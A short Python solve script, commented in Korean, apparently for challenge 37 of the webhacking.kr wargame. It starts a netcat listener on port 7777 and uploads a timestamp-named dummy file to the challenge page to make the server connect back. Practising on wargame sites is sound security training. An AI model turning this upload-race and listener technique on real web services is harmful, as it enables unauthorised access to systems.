import requests
import os
from time import *

# 해당 파이썬 코드 실행환경 
# 1. 방화벽에서 해당 포트를 열어놔야 함
# 2. nc가 설치된 Linux환경

#37번 문제
url = 'https://webhacking.kr/challenge/web-18/index.php'

def main():
    os.system("nc -nlvp 7777 &")
    sleep(1)
    session = requests.session()
    session.get(url)
    file_name = 'tmp-{}'.format(int(time()))
    files = {
        'upfile' : (file_name,'dummy_data')
    }
    session.post(url,files=files)    
    sleep(2)
    
if __name__=='__main__':
    main()